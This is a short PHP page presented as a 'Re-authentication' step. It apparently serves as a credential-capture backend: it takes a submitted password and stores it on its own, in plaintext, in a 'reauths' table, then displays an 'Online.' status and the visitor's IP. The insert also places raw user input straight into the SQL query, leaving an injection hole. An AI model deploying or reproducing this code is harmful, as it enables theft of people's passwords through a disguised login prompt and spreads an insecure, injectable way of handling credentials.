<html>
<head>
  <meta charset="utf-8"/>
  <title>Re-authentication</title>
  <link rel="stylesheet" type="text/css" href="upl.css">
</head>
<body>

    <?php

    include 'conMysql.php';

    $pass1 = $_POST["pd1"];

    $sql = "INSERT INTO reauths VALUES ('$pass1')";

    if (!mysqli_query($conn, $sql)){
      die('error inserting record');
    }

    $newRecord = "1 new record added to reauths";

    $conn->close();

    ?>

    <span id="status">Online.</span>

    <span id="uip">User IP: <?php echo $_SERVER["REMOTE_ADDR"]; ?></span>
    <span id="gint">Gateway Interface: <?php echo $_SERVER["GATEWAY_INTERFACE"]; ?></span>

</body>
</html>
